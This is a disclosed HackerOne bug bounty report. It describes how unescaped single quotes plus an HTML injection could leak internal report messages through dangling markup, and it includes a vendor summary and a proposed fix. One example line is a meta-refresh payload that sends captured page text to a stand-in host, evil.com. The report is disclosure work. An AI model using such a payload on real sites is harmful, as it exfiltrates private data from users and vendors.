@@ -1,0 +1,63 @@
+ReportLink:https://hackerone.com/reports/110578
+WeaknessName:Violation of Secure Design Principles
+Reporter:https://hackerone.com/intidc
+ReportedTo:HackerOne(security)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:26.01.2016 16:05:58
+
+Summary:
+There was a legitimate issue in our app where Markdown was not being escaped properly, but it was not immediately exploitable since it relies on the existence of an injection vulnerability (which can theoretically be introduced in the future). The issue was a real issue that we did not know existed, verified through an investigation and finally patched up.
+
+We rely on our implementation of Redcarpet to escape the HTML output of any Markdown input, and this output is passed directly into our DOM via `dangerouslySetInnerHTML` in our React component. Because it turns out that we weren't properly escaping this HTML output, this could potentially be exploited.
+
+All other non-Markdown user-generated content is displayed via React without using `dangerouslySetInnerHTML`, so it is auto-escaped by React and thus not vulnerable to an exploit.
+Hey,
+
+This is more like an in-depth security thing with a reasonable attack scenario.
+
+In some occasions, it seems to be possible to leak sensitive data to an external server, not affected by the CSP. This can happen in the following situation:
+
+1. There's a HTML injection vulnerability
+2. The sensitive data is preceded by the HTML injection vulnerability
+3. After the sensitive data, there's a single quote (could be inserted by the attacker)
+
+Due to these requirements I haven't been able to test it, though I did found some places where it theoretically could work.
+
+The problem is that HackerOne does not convert single quotes to their HTML entities (&lsquo;), not in their own texts, nor in user-supplied fields (like report title, body, ...). This will make browser interpret the data between the quote and the HTML injection an attribute in some cases. Using anchor tags or meta redirects, we can capture this data using a logger stored at a remote server.
+
+## Example
+
+Say someone has found a way to inject HTML into a comment,  summary or report, he could read the internal team messages. Here's a quick sketch of a report to illustrate this:
+
+[report title]
+\> reporter: report body
+ < vendor: reply
+ < vendor: internal reply
+\> reporter: comment (that contains a single quote)
+
+At this point, if the reporter would add the following to the summary (above the report body):
+
+> <meta http-equiv="refresh" content='0; url=https://evil.com/log.php?text=
+
+This will send the following to the server:
+
+>report body + vendor reply + internal reply
+
+Because the unconverted ' in the last comment would close the attribute and form a valid HTML element.
+You could also do this with an anchor tag an its href attribute, but this would require more user interaction as the target would also have to click on the malicious link.
+
+Another vulnerable layout would be for example the list of reports: if an attacker would be able to get HTML injection in the title, he could easily steal other reports titles using this technique.
+
+## The fix
+
+The behavior described above can easily be prevented.: 
+
+I'd just add the conversion to &lsquot  to your sanitization filter. I can't think of any legit case where this would cause troubles. Also, it can be a good practice to convert single quotes to their HTML entities in HackerOne provided texts as well.
+
+
+Best regards
+
+
+Inti
